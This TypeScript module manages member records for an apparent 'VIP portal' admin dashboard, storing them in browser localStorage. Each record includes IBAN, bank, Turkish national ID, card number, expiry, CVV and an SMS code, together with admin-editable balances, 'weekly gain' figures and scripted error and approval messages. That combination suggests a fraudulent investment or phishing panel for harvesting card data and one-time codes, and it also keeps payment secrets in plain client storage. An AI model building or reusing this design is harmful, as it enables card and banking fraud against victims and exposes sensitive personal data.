
import type { AdminMember } from "@/app/dashboard/admin/page";

const MEMBER_STORAGE_KEY = 'vip_portal_members';
const FIREBASE_USERS_CACHE_KEY = 'firebaseUsersCache';
const CACHE_EXPIRATION_MS = 5 * 60 * 1000; // 5 minutes

// A placeholder for a server-side call to fetch Firebase users.
// In a real app, this would be an API endpoint calling the Firebase Admin SDK.
export async function fetchFirebaseUsers(): Promise<{ id: string; email: string }[]> {
    if (typeof window === 'undefined') {
        return [];
    }
    // This is a placeholder. In a real-world scenario, you can't get a user list on the client.
    // This requires the Admin SDK on a secure backend.
    // We will simulate this by looking at what the admin might have added manually.
    console.warn("fetchFirebaseUsers is a client-side placeholder. For a real app, use a secure backend with Firebase Admin SDK to list users.");
    
    // Attempt to get from cache first
    const cachedData = localStorage.getItem(FIREBASE_USERS_CACHE_KEY);
    if (cachedData) {
        try {
            const { timestamp, users } = JSON.parse(cachedData);
            if (Date.now() - timestamp < CACHE_EXPIRATION_MS) {
                return users;
            }
        } catch (e) {
            console.error("Failed to parse Firebase users cache", e);
            localStorage.removeItem(FIREBASE_USERS_CACHE_KEY);
        }
    }
    
    // For this example, we'll extract potential users from the members list itself,
    // as we can't call the real Admin SDK.
    const storedMembers = getMembersFromStorageOnly();
    const users = storedMembers
      .filter(m => m.id && m.phone)
      .map(m => ({ id: m.id, email: m.phone }));
    
    try {
        localStorage.setItem(FIREBASE_USERS_CACHE_KEY, JSON.stringify({ timestamp: Date.now(), users }));
    } catch (e) {
        console.error("Failed to set Firebase users cache", e);
    }
    
    return users;
}

function getMembersFromStorageOnly(): AdminMember[] {
    if (typeof window === 'undefined') {
        return [];
    }
    const storedDetailsJSON = localStorage.getItem(MEMBER_STORAGE_KEY);
    if (storedDetailsJSON) {
        try {
            return JSON.parse(storedDetailsJSON);
        } catch (e) {
            console.error("Failed to parse members from localStorage", e);
        }
    }
    return [];
}


export async function getMembers(): Promise<AdminMember[]> {
    if (typeof window === 'undefined') {
        return [];
    }
    
    try {
        // This function now primarily relies on what's in local storage,
        // which gets updated when a new user is created via the admin panel.
        // The concept of "syncing" with Firebase Auth is simulated.
        const storedMembers = getMembersFromStorageOnly();

        // Add default values to all members to prevent errors on the frontend
        const allMembersWithDefaults = storedMembers.map(member => ({
            id: member.id || '',
            phone: member.phone || '', // email is stored in phone field
            name: member.name || '',
            iban: member.iban || '',
            bank: member.bank || '',
            tc: member.tc || '',
            il: member.il || '',
            ilce: member.ilce || '',
            weeklyGain: member.weeklyGain || '',
            errorMessage: member.errorMessage || 'İşlem sırasında bir hata oluştu. Lütfen destek ekibiyle iletişime geçin.',
            onayMesaji: member.onayMesaji || 'İşleminiz başarıyla alındı.',
            invoiceAmount: member.invoiceAmount || '',
            accountActivity: member.accountActivity || "",
            meetingInfo: member.meetingInfo || "",
            currentBalance: member.currentBalance || "0 TL",
            status: member.status || 'Pasif',
            transactionStatus: member.transactionStatus || 'allowed',
            cardNumber: member.cardNumber || '',
            cardExpiry: member.cardExpiry || '',
            cardCvv: member.cardCvv || '',
            smsCode: member.smsCode || '',
        }));
        
        return allMembersWithDefaults;

    } catch (error) {
        console.error("Failed to process members", error);
        return [];
    }
}


export function setMembers(members: AdminMember[]): void {
     if (typeof window === 'undefined') {
        return;
    }
    try {
        localStorage.setItem(MEMBER_STORAGE_KEY, JSON.stringify(members));
        // Update the simulated Firebase cache as well
        const users = members
            .filter(m => m.id && m.phone)
            .map(m => ({ id: m.id, email: m.phone }));
        localStorage.setItem(FIREBASE_USERS_CACHE_KEY, JSON.stringify({ timestamp: Date.now(), users }));
    } catch (error) {
        console.error("Failed to save members to localStorage", error);
    }
}
